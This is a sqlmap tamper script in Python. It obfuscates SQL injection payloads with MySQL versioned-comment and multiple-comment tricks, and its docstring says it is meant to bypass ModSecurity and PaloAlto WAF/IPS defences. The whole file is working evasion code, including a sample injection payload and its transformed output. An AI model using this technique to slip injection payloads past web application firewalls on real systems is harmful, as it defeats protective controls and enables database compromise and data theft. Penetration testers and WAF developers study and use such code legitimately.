#!/usr/bin/env python

"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Embraces ModSecurity zero-versioned bypass and multiple space to comment bypass in one

    Requirements:
        * MySQL >= 5.0

    Tested against:
        * MySQL <= 5.0
        * MySQL >= 5.0

    Notes:
        * Can be used to bypass PaloAlto and ModSecurity WAF/IPS

    >>> tamper("1) AND 6362=9217 AND (7458=7458")
    /*!000001)*//**//**//**//*!00000AND*//**//**//**//*!000006362=9217*//**//**//**//*!00000AND*//**//**//**//*!00000(7458=7458*/
    """
    if payload:
        retVal = []
        amountToReplace = 3

        for data in payload.split(" "):
            retVal.append("/*!00000%s*/" % data)

        return '%s' % ('/**/' * amountToReplace).join(retVal)
